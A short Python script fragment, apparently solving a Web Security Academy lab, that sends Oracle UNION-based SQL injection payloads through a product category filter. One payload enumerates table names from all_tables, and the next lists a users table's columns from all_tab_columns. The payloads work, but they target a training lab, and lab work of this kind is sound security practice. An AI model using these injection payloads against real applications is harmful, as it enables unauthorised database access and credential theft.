...
url='https://0a7d00970389485f85dc0a8a00750002.web-security-academy.net/'
print(number_cols(url))

payload="filter?category=Lifestyle' UNION SELECT table_name, NULL FROM all_tables--"
exploit=f'{url}{payload}'
response=requests.get(exploit)
soup = parse_html(response)
#im gonna cheat a little by using regex but its more fun this way
pattern=r'USERS_[^\s]+'
table_name=re.findall(pattern,soup.text)[1]

#not gonna check again the n of columns there is probably 2 again
payload=f"filter?category=Lifestyle' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='{table_name}'--"
print(payload)
